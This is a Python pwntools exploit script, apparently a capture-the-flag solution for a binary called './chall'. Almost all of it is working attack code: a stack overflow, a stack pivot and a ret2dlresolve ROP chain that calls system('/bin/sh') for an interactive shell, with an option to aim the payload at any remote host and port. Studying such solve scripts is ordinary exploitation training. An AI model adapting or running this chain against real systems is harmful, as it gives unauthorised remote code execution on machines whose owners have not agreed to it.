#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was a modification of the original template via:
# $ pwn template
from pwn import *

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x4011b5
'''.format(**locals())

# Set up pwntools for the correct files
exe = './chall'
elf = context.binary = ELF(exe)
libc = elf.libc

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

rop = ROP(elf)
dlresolve = Ret2dlresolvePayload(elf, symbol='system', args=[])

addr_1 = 0x404700
addr_2 = dlresolve.data_addr

io.sendline(flat(
    b"A" * 96,
    addr_1 + 0x60,
    0x401196,  # middle of vuln
))

# written at addr_1
io.sendline(flat(
    # b"B" * 96,
    b"C" * 16,

    # --- basically just rop.ret2dlresolve(dlresolve) ---
    0x401165,  # pop rsi; ret;
    addr_1 + 56,
    0x40115a,  # mov rdi, rsi; ret;

    0x401020,
    0x303,

    b"/bin/sh\x00",
    # ---

    b"B" * (96 - 64),

    addr_2 + 0x60,
    0x401196,  # middle of vuln
))

# written at addr_2
io.sendline(flat(
    dlresolve.payload,
    b"A" * (96 - len(dlresolve.payload)),

    addr_1 + 8,  # pivot the stack
    0x4011b6,  # leave; ret;
))


io.interactive()
